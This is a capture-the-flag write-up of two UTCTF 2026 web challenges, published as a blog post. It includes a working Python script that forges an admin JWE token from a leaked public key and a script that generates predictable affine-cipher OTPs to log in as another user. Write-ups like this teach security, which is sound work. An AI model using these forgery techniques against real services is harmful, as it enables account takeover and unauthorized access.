@@ -1,0 +1,257 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-03-09 17:43:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /UTCTF-2026-web/
+---
+* TOC
+{:toc}
+
+## Break the Bank
+
+**Category**: web
+
+**Description**: Let's just say that this bank isn't exactly following the latest trends in web design (or web security, for that matter). Just take a look at that website! by Emmett (@emdawg25 on discord) `challenge.utctf.live:5926`
+
+I go to `challenge.utctf.live:5926` and find an old themed online banking site:
+
+![Alt text](/images/Online-Banking1.png)
+
+In the source code I find `http://challenge.utctf.live:5926/resources/FNSB_InternetBanking_Guide.pdf`. In the pdf there are the test credentials: `testuser:testpass123`. You can login with these creds to see what type of cookies you get when you login. 
+
+Then I looked at `http://challenge.utctf.live:5926/resources/` where I found two new files. `memo.txt` and `key.pem`:
+```shell
+curl http://challenge.utctf.live:5926/resources/memo.txt  
+FIRST NATIONAL SAVINGS BANK  
+INTERNAL MEMORANDUM  
+  
+TO:      Application Development Team  
+FROM:    Harold J. Whitmore, President & Chief Executive Officer  
+cc: Margaret L. Osei, VP of Information Technology  
+Dennis R. Kaczmarek, Director of Application Development  
+DATE:    November 3, 1997  
+RE:      Technology Modernization Initiative — Status & Priorities  
+CLASSIFICATION: INTERNAL USE ONLY  
+  
+------------------------------------------------------------------------  
+  
+Team,  
+  
+I want to take a moment to address the progress we have made — and the  
+work that remains — as we continue our effort to modernize the banks  
+core technology infrastructure.  
+  
+As many of you are aware, FNSB has operated on a foundation of legacy  
+systems built over several decades. Our primary core banking platform  
+dates to 1974, and while it has served us reliably, the constraints it  
+places on our ability to deliver new products and services to our  
+customers are becoming increasingly difficult to justify. The board has  
+reaffirmed its commitment to the modernization initiative, and it falls  
+to this team to execute on that vision responsibly.  
+  
+... etc etc
+
+curl http://challenge.utctf.live:5926/resources/key.pem  
+-----BEGIN PUBLIC KEY-----  
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1  
+7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE  
+ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG  
+cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy  
+pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5  
+TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK  
+OQIDAQAB  
+-----END PUBLIC KEY-----
+```
+
+When I login I see I get assigned a JWE (it has 5 parts):
+```http
+HTTP/1.1 200 OK
+Date: Fri, 13 Mar 2026 00:59:35 GMT
+Content-Type: application/json
+Set-Cookie: fnsb_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.DSafbAzneU3jfpyJhEdHWOZFXkogpyfzM9I4wecOBxno6lXNWD-z8E5EM4-kjDWLr6Vu0lWLZDbHvAfqU_npf_HQgtUI8H72f4FV_xJQlXudSSMv7nygfT7VoPeJXrAsUnC7J2AV7VfpgLeAykS9eFJ6h_-f8W2lV6Y7-pWFXYDPhAwxGuWqKqrdxgctF73hYaoLWbhC2y97LOuYij-Z5QXHFgfSbq5l2sO4AABJHQCgj2-G6avKb90VqyAUAprzcbhhH_7-Sxtn7CvBLglyEohtpniOLsukZ265sd7A2DFkcfQvW84hctpsMtldCXPCOkxGDEECXZfX0KQ5G0KClQ.YbhXJ_NF_d7cWawu.DiK3cNNjmUblnLx06016r60zxtG9I2jHFCDPcsYzoZxymF45KucIHp4eYNnRUF1T5NjaefMxmMtlg56IQG2MfVeoeVE9MisedAdp-heUXMccFqNqvfsfahYDEv3Js6YOOZqmVa4d0ahH7-NK3-QQXOAK4J9RNs9z7vlAlvrivVFXBM90kjiuITzJzhd33k8yTa49D3g24bsznrEjGu0ekSyxPSsdOjjruvKJIPNzsgWrZcGUo3cnxJiAFfhNrsS8WqmzBOAZ8Lu1SS3pnxYgZF7CKpUCwrXorS9lsuN-gNX5u32tHLB1VbgghVk7PC7vFNXrS1caU3JAg2DQs2m1NqZ_Y5-0K8ODqJG9lWE6XeqDdRZU2QFK1VlJ2v1HdaqVViThCiIeS3NAN7VAJFsO2Ni82IHdZoHMC9J9XrCfrTuQhyJAiOpC5E0QUORcZbJXUNrUF7-GAluGnRAMWk6duUocsQVSFZLkhJ4HUdIdrXAR6sU9QMkx4SW1Q8lYacphMEXtf1fi6EbZL6r9L42Nj9xJoF7QMJ-_UjIJPlDW15U7BZU6OjRrtnNz4ZhejGo_kYp6rkdsn0ouYWXqBzUwcCytu4IWg22BzDfqFLPkiN1g5tFG-nQ9ol06G4gMR1HmwVbGQrNPHph5swUyAn5dCnhSFMUd9_OVrOfL55x8PQ.IA7g3U2OaMABgLLjoY9zAA; Path=/
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Content-Length: 1167
+
+{"token":"eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.DSafbAzneU3jfpyJhEdHWOZFXkogpyfzM9I4wecOBxno6lXNWD-z8E5EM4-kjDWLr6Vu0lWLZDbHvAfqU_npf_HQgtUI8H72f4FV_xJQlXudSSMv7nygfT7VoPeJXrAsUnC7J2AV7VfpgLeAykS9eFJ6h_-f8W2lV6Y7-pWFXYDPhAwxGuWqKqrdxgctF73hYaoLWbhC2y97LOuYij-Z5QXHFgfSbq5l2sO4AABJHQCgj2-G6avKb90VqyAUAprzcbhhH_7-Sxtn7CvBLglyEohtpniOLsukZ265sd7A2DFkcfQvW84hctpsMtldCXPCOkxGDEECXZfX0KQ5G0KClQ.YbhXJ_NF_d7cWawu.DiK3cNNjmUblnLx06016r60zxtG9I2jHFCDPcsYzoZxymF45KucIHp4eYNnRUF1T5NjaefMxmMtlg56IQG2MfVeoeVE9MisedAdp-heUXMccFqNqvfsfahYDEv3Js6YOOZqmVa4d0ahH7-NK3-QQXOAK4J9RNs9z7vlAlvrivVFXBM90kjiuITzJzhd33k8yTa49D3g24bsznrEjGu0ekSyxPSsdOjjruvKJIPNzsgWrZcGUo3cnxJiAFfhNrsS8WqmzBOAZ8Lu1SS3pnxYgZF7CKpUCwrXorS9lsuN-gNX5u32tHLB1VbgghVk7PC7vFNXrS1caU3JAg2DQs2m1NqZ_Y5-0K8ODqJG9lWE6XeqDdRZU2QFK1VlJ2v1HdaqVViThCiIeS3NAN7VAJFsO2Ni82IHdZoHMC9J9XrCfrTuQhyJAiOpC5E0QUORcZbJXUNrUF7-GAluGnRAMWk6duUocsQVSFZLkhJ4HUdIdrXAR6sU9QMkx4SW1Q8lYacphMEXtf1fi6EbZL6r9L42Nj9xJoF7QMJ-_UjIJPlDW15U7BZU6OjRrtnNz4ZhejGo_kYp6rkdsn0ouYWXqBzUwcCytu4IWg22BzDfqFLPkiN1g5tFG-nQ9ol06G4gMR1HmwVbGQrNPHph5swUyAn5dCnhSFMUd9_OVrOfL55x8PQ.IA7g3U2OaMABgLLjoY9zAA","redirect":"/profile"}
+```
+
+I can see more details about the token by `base64` decoding the first part:
+```shell
+echo "eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0" | base64 -d  
+{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}
+```
+
+Since I have their public key I can forge a token because the application uses RSA-OAEP. The server holds the private key and decrypts the token. Since encryption does not authenticate the sender, the server cannot distinguish between tokens it created and tokens created by an attacker.
+
+I found that `/admin` exists but I need valid authentication. Without it, it says: `error "Forbidden: admin subject required"`
+
+I make this python script to forge a valid JWE:
+```python
+from jose import jwe
+import json
+
+with open("key.pem","rb") as f:
+    pub = f.read()
+
+payload = json.dumps({
+    "sub": "admin"
+})
+
+token = jwe.encrypt(
+    payload,
+    pub,
+    algorithm="RSA-OAEP-256",
+    encryption="A256GCM",
+    cty="JWT"
+)
+
+print(token.decode())
+```
+
+Get the token:
+```shell
+python3 solve.py  
+eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.OAUjTTrENEL9JOJJcnF3Vp8LFXapFjtXh476mBBk5L2aOrp9-_0NnKn1RaaTBd-jrqtUeb8J5lbKMYPn6vWzsdGGkLieYOaaj-WiDXKWCvR  
+eiTI7YcSwup690k2ooVWoSxqpPPnQRh0Z7-wVvhvIdjzTZnxeevxhGX0C5x6nUP3246zrFrHwDpRYrde1MOTDIRdOZDblRyiC1rZd0IzORASTo-mFQE5puC8hoSDN6zm4TnddnlCqVnl89REQfgF-XHRqVg7uaQBIg-3OOUmYlpz4b_  
+un9jlfW0wikN9A94uRkxMH5VA5LNUR0FhWswYzr-hqcZQcbj8IXTZtOKxcTA.TpXlPBAeUIT-lXhM._g3X4aLZtSL_pPzT2OrlqA.wfSPsR37_eFW2RXnPCpfvg
+```
+
+Once I update my token I can go to `/admin` and get the flag:
+
+![Alt text](/images/Admin-Console-RESTRICTED.png)
+
+`utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}`
+
+___
+
+## Time to Pretend
+
+**Category**: web
+
+**Description**: Did you hear about the big AffiniTech outage earlier this week? Earlier today, someone leaked some internal traffic of theirs on the darkweb as proof that they pwned the service. But I think there's more here than just logs; maybe you can break in too? by Emmett (@emdawg25 on discord) `challenge.utctf.live:9382`
+
+I get the challenge file `aftechLEAK.pcap`:
+```shell
+file aftechLEAK.pcap  
+aftechLEAK.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
+```
+
+After opening it in wireshark I see some POST requests to `/debug/getOTP` that look like this:
+```shell
+{"username": "almond", "epoch": 1773290640}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.6 Python/3.11.15
+Date: Thu, 12 Mar 2026 04:44:00 GMT
+Content-Type: application/json
+Content-Length: 47
+Connection: close
+
+{
+"add": 4,
+"mult": 1,
+"otp": "epqsrh"
+}
+
+{"username": "peterson", "epoch": 1773290611}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.6 Python/3.11.15
+Date: Thu, 12 Mar 2026 04:43:31 GMT
+Content-Type: application/json
+Content-Length: 50
+Connection: close
+
+{
+"add": 1,
+"mult": 17,
+"otp": "wrmrevfo"
+}
+```
+Each OTP is an affine cipher applied to the username with parameters derived from the unix epoch timestamp. 
+- `add = epoch % 26`
+- `mult = [1,3,5,7,9,11,15,17,19,21,23,25][epoch % 12]`
+- Each letter: `chr(((mult * (ord(c) - ord('a')) + add) % 26) + ord('a'))`
+
+On `view-source:http://challenge.utctf.live:9382/` I find this html comment:
+```html
+<!-- LOGIN FORM --> 
+<!-- NOTICE to DEVS: login currently disabled, see /urgent.txt for info -->
+```
+
+On `http://challenge.utctf.live:9382/urgent.txt` I read this:
+```shell
+URGENT - READ IMMEDIATELY
+=========================
+TO: dev team
+FROM: timothy
+DATE: 2013-11-12 03:47:22
+
+guys,
+
+i think someone figured out the AffinKey system. i dont have time to explain everything right now but there is a SERIOUS flaw in how we generate the OTPs. i only just realized it tonight and i am freaking out.
+
+i have locked every account in the system except mine while we figure this out. DO NOT unlock anyone until we have patched this. i dont care if users complain. i dont care if chad emails again. nobody gets in.
+
+my account stays active because i need access to keep monitoring the situation. if you need to reach me use signal.
+
+do NOT roll back the auth system yet - i need to look at the logs first to see if anyone has already gotten in. if they have we have a much bigger problem.
+
+i will write up a full post-mortem once i stop shaking. 
+
+do not talk to anyone about this. not on slack. not on email. definitely not on the forum.
+
+- timothy
+
+p.s. i know kevin is going to say "i told you so" about building this ourselves.
+he was right. i don't want to hear it.
+```
+
+So I know I need to login as `timothy`.
+
+I run this script to make a POST request to `/auth` with the correct OTP to login, then print the cookie so I can visit `/portal` in the browser and get the flag:
+```python
+#!/usr/bin/env python3
+import time
+import urllib.request
+import urllib.error
+import json
+import http.cookiejar
+
+VALID_MULTS = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]
+
+def generate_otp(username: str, epoch: int) -> str:
+    add  = epoch % 26
+    mult = VALID_MULTS[epoch % 12]
+    return ''.join(chr(((mult * (ord(c) - ord('a')) + add) % 26) + ord('a')) for c in username)
+
+BASE = "http://challenge.utctf.live:9382"
+
+cj      = http.cookiejar.CookieJar()
+opener  = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+
+# 1. Login
+epoch   = int(time.time())
+otp     = generate_otp("timothy", epoch)
+payload = json.dumps({"username": "timothy", "otp": otp}).encode()
+req     = urllib.request.Request(BASE + "/auth", data=payload,headers={"Content-Type": "application/json"}, method="POST")
+resp    = opener.open(req, timeout=10)
+print("Login:", resp.status, resp.read().decode())
+print("Cookies:", [(c.name, c.value) for c in cj])
+```
+
+Output:
+```shell
+python3 solve2.py  
+Login: 200 {  
+"message": "Access granted"  
+}  
+  
+Cookies: [('session', 'eyJhdXRoZW50aWNhdGVkIjp0cnVlfQ.abOCTw.PX1jhHSDxIYLROZQ2HH-TTMdyW0')]
+```
+
+I go to the browser and visit `http://challenge.utctf.live:9382/portal` with the jwt to read the flag:
+
+![Alt text](/images/Wallet-Portal.png)
+
+`utflag{t1m3_1s_n0t_r3l1@bl3_n0w_1s_1t}`
